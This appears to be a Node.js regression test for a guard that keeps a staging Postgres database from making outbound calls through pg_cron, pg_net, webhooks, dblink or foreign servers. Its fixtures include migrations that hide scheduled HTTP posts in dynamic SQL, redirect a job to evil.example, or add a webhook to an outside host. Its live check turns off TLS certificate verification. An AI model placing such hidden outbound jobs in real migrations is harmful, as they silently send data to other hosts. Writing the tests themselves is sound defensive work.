// S1 regression tests: a staging database cannot be made to contact production
// (or anything else) through database-side scheduled or triggered operations.
//   node scripts/staging-db-guard-test.mjs            # offline
//   node scripts/staging-db-guard-test.mjs --network  # + read-only check of the live staging database
//
// Offline proves the REPLAY: every migration that can make the database reach
// the network is either transformed (pinned to its exact bytes) or refused, and
// the runner exits before connecting. --network proves the CURRENT STATE.

import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawnSync } from "node:child_process";
import { scanMigrationSql, prepareForStaging, STAGING_TRANSFORMS, MigrationEgressError, evaluate, newEgress, sha256, stripSqlComments } from "./_db-egress.mjs";

let pass = 0, fail = 0;
const ok = (c, m, d = "") => { if (c) { pass++; console.log(`  ✓ ${m}`); } else { fail++; console.error(`  ✗ ${m}${d ? `\n      ${d}` : ""}`); } };
const kinds = (sql) => scanMigrationSql(sql).map((h) => h.kind);
const MIG = "supabase/migrations";

console.log("\n  SCANNER (every database-side way out)");
for (const [label, sql, kind] of [
  ["pg_cron schedule", "select cron.schedule('x', '* * * * *', $$select 1$$);", "pg_cron schedule"],
  ["pg_cron schedule_in_database", "select cron.schedule_in_database('x','* * * * *','select 1','postgres');", "pg_cron schedule"],
  ["pg_cron re-activation", "select cron.alter_job(job_id := 1, active := true);", "pg_cron job re-activation"],
  ["pg_net POST", "select net.http_post(url := 'https://example.com', body := '{}');", "pg_net HTTP call"],
  ["pg_net GET", "select net.http_get('https://example.com');", "pg_net HTTP call"],
  ["database webhook", "create trigger t after insert on x for each row execute function supabase_functions.http_request('https://a', 'POST', '{}', '{}', '1000');", "database webhook"],
  ["http extension call", "select extensions.http_post('https://a', '', 'text/plain');", "http extension call"],
  ["http extension install", "create extension if not exists http with schema extensions;", "http / dblink / fdw extension"],
  ["dblink install", "create extension dblink;", "http / dblink / fdw extension"],
  ["dblink call", "select dblink_connect('host=prod');", "dblink call"],
  ["foreign server", "create server prod foreign data wrapper postgres_fdw options (host 'x');", "foreign server"],
  ["DYNAMIC schedule inside EXECUTE format()", "do $$ begin execute format('select cron.schedule(%L,%L,%L)', 'j', '* * * * *', 'select 1'); end $$;", "pg_cron schedule"],
]) ok(kinds(sql).includes(kind), `detects ${label}`, JSON.stringify(kinds(sql)));
ok(kinds("-- select cron.schedule('x','* * * * *','select net.http_post(1)');\n/* net.http_post */ select 1;").length === 0, "ignores the same text inside comments");
ok(kinds("create extension if not exists pg_net; create extension if not exists pg_cron;").length === 0, "installing pg_net / pg_cron alone is not egress (0011 keeps them)");

console.log("\n  THE REPOSITORY'S MIGRATIONS");
const files = fs.readdirSync(MIG).filter((f) => f.endsWith(".sql")).sort();
const withEgress = files.filter((f) => scanMigrationSql(fs.readFileSync(path.join(MIG, f), "utf8")).length);
ok(withEgress.length === 1 && withEgress[0] === "0011_outbox_ops.sql", `exactly one migration can make the database call out: 0011 (scanned ${files.length})`, withEgress.join(", "));
const sql11 = fs.readFileSync(path.join(MIG, "0011_outbox_ops.sql"), "utf8");
ok(sha256(sql11) === STAGING_TRANSFORMS["0011_outbox_ops.sql"].sha256, "0011 is byte-identical to the reviewed version (production applies it unchanged)");
let prepErrors = [];
for (const f of files.filter((f) => f !== "0055_enable_device_push.sql")) {
  try { prepareForStaging(f, fs.readFileSync(path.join(MIG, f), "utf8")); } catch (e) { prepErrors.push(e.message); }
}
ok(prepErrors.length === 0, "every migration the staging replay applies is prepared without refusal", prepErrors.join(" | "));

console.log("\n  THE 0011 TRANSFORM");
const t = prepareForStaging("0011_outbox_ops.sql", sql11);
ok(t.transformed && kinds(t.sql).length === 0, "the transformed 0011 contains no egress at all");
ok(!/passport-xi-five|net\.http_post/.test(stripSqlComments(t.sql)), "no production URL and no pg_net call survive in executable SQL");
const start = sql11.indexOf("select cron.schedule('outbox-drain'");
const end = sql11.indexOf("$job$);", start) + "$job$);".length;
ok(t.sql.startsWith(sql11.slice(0, start)) && t.sql.endsWith(sql11.slice(end)), "everything else in 0011 is kept byte for byte (pg_cron, pg_net, app_secrets, outbox_health, reconcile_outbox)");
for (const keep of ["create extension if not exists pg_cron", "create extension if not exists pg_net", "create table if not exists public.app_secrets", "function public.outbox_health", "function public.reconcile_outbox", "cron.unschedule('outbox-drain')"])
  ok(t.sql.includes(keep), `  kept: ${keep}`);
let threw = null;
try { prepareForStaging("0011_outbox_ops.sql", sql11 + "\n"); } catch (e) { threw = e; }
ok(threw instanceof MigrationEgressError && /contents changed/.test(threw.message), "a CHANGED 0011 is refused (pin), not silently half-transformed");
threw = null;
try { prepareForStaging("0099_new.sql", "begin; select cron.schedule('drain','* * * * *', $j$ select net.http_post('https://rvptronniomlqumjhyrr.supabase.co/x') $j$); commit;"); } catch (e) { threw = e; }
ok(threw instanceof MigrationEgressError, "a NEW migration with outbound scheduling is refused");

console.log("\n  THE RUNNER (exits before connecting)");
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "mig-guard-"));
const copy = (extra) => {
  const d = fs.mkdtempSync(path.join(tmp, "d-"));
  for (const f of files) fs.copyFileSync(path.join(MIG, f), path.join(d, f));
  for (const [f, body] of Object.entries(extra)) fs.writeFileSync(path.join(d, f), body);
  return d;
};
const runDry = (dir) => spawnSync(process.execPath, ["scripts/apply-migrations.mjs", "--dry"], { env: { PATH: process.env.PATH, MIGRATIONS_DIR: dir }, encoding: "utf8" });
let r = runDry(copy({}));
ok(r.status === 0 && /transformed for staging: 0011_outbox_ops\.sql/.test(r.stdout), "the real migration set plans cleanly, with 0011 transformed", (r.stderr || "").slice(0, 200));
r = runDry(copy({ "0099_sneaky.sql": "do $$ begin execute 'select cron.schedule(''x'',''* * * * *'',''select net.http_post(''''https://passport-xi-five.vercel.app/api/dispatch'''')'')'; end $$;" }));
ok(r.status === 2 && /REFUSING TO RUN: database egress/.test(r.stderr), "a migration hiding a schedule in a dynamic string is refused before connecting");
r = runDry(copy({ "0011_outbox_ops.sql": sql11.replace("passport-xi-five.vercel.app", "evil.example") }));
ok(r.status === 2 && /contents changed/.test(r.stderr), "an edited 0011 is refused before connecting");
r = runDry(copy({ "0099_webhook.sql": "create trigger t after insert on public.posts for each row execute function supabase_functions.http_request('https://mineex.ca/hook','POST','{}','{}','1000');" }));
ok(r.status === 2, "a migration adding a database webhook is refused before connecting");
fs.rmSync(tmp, { recursive: true, force: true });
const runnerSrc = fs.readFileSync("scripts/apply-migrations.mjs", "utf8");
ok(/await client\.query\(sql\);\s*\/\/[\s\S]{0,300}?newEgress\(before, await inspectDatabase\(client, \{ inTransaction: true \}\)\)[\s\S]{0,200}?await client\.query\("commit"\)/.test(runnerSrc),
   "the runner checks for new egress INSIDE the transaction, before commit (dynamic jobs are rolled back)");
ok(/evaluate\(await inspectDatabase\(client\)\)/.test(runnerSrc) && /evaluate\(await inspectDatabase\(c\)\)/.test(fs.readFileSync("scripts/seed-isolation-fixtures.mjs", "utf8")),
   "the runner and the seeder both refuse to finish on a database that can reach the network");

console.log("\n  THE LIVE RULES (synthetic database reports)");
const base = { extensions: ["pg_cron", "pg_net"], cronJobs: [], httpFunctions: [], webhookTriggers: [], foreignServers: [], pgNet: { recent: 0, queued: 0 }, recentMinutes: 5 };
const job = (active) => ({ jobid: "1", jobname: "outbox-drain", active, egress: true, targets: ["passport-xi-five.vercel.app"] });
ok(evaluate({ ...base, cronJobs: [job(true)] }).fail.length === 1, "an ACTIVE outbound job fails");
let e = evaluate({ ...base, cronJobs: [job(false)] });
ok(e.fail.length === 0 && e.contained.length === 1, "an INACTIVE outbound job is reported as contained, not hidden");
ok(newEgress({ ...base, cronJobs: [job(false)] }, { ...base, cronJobs: [job(true)] }).length === 1, "RE-ACTIVATING a contained job is caught as new egress");
ok(newEgress(base, { ...base, cronJobs: [job(true)] }).length === 1, "SCHEDULING a new outbound job is caught");
ok(evaluate({ ...base, httpFunctions: ["public.ping"] }).fail.length === 1, "an HTTP-capable function fails");
ok(evaluate({ ...base, webhookTriggers: ["posts.hook -> supabase_functions.http_request"] }).fail.length === 1, "a database webhook fails");
ok(evaluate({ ...base, foreignServers: ["prod"] }).fail.length === 1, "a foreign server fails");
ok(evaluate({ ...base, extensions: [...base.extensions, "dblink"] }).fail.length === 1, "an installed dblink fails");
ok(evaluate({ ...base, pgNet: { recent: 3, queued: 0 } }).fail.length === 1, "recent pg_net traffic fails");
ok(evaluate({ ...base, pgNet: { recent: 0, queued: 2 } }).fail.length === 1, "queued pg_net requests fail");
ok(evaluate(base).fail.length === 0, "a quiet database passes");

if (process.argv.includes("--network")) {
  console.log("\n  LIVE STAGING (read-only)");
  const r = spawnSync(process.execPath, ["scripts/staging-db-egress-check.mjs", "--minutes", "5"], { encoding: "utf8" });
  ok(r.status === 0, "the staging database cannot reach the network (no active outbound job, no HTTP functions, webhooks or foreign servers, no pg_net traffic in 5 min)", (r.stderr || r.stdout).slice(-300));
  ok(/outbox-drain\s+active=false/.test(r.stdout), "the S1 job is present only as INACTIVE");

  // The runner inspects INSIDE each migration's transaction. A probe that fails
  // there must not abort the migration: prove it in a READ-ONLY transaction, with
  // one probe forced to fail, then confirm the transaction still works.
  const { default: pg } = await import("pg");
  const { inspectDatabase } = await import("./_db-egress.mjs");
  const dsn = fs.readFileSync("supabase/staging/.connection", "utf8").trim();
  if (!dsn.includes("jmljfovtfxcdhjmtlnva") || dsn.includes("rvptronniomlqumjhyrr")) { ok(false, "staging connection"); }
  else {
    const c = new pg.Client({ connectionString: dsn, ssl: { rejectUnauthorized: false } });
    await c.connect();
    await c.query("begin read only");
    const realQuery = c.query.bind(c);
    c.query = (q, a) => (/pg_foreign_server/.test(String(q)) ? realQuery("select * from no_such_table_egress_probe") : realQuery(q, a));
    const rep = await inspectDatabase(c, { inTransaction: true });
    c.query = realQuery;
    let alive = false; try { alive = (await c.query("select 1 as one")).rows[0].one === 1; } catch {}
    await c.query("rollback"); await c.end();
    ok(alive && Array.isArray(rep.cronJobs) && rep.cronJobs.length >= 1, "a failing probe inside a transaction is undone by its savepoint; the transaction stays usable (read-only, live)");
  }
}

console.log(`\nstaging db guard: ${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
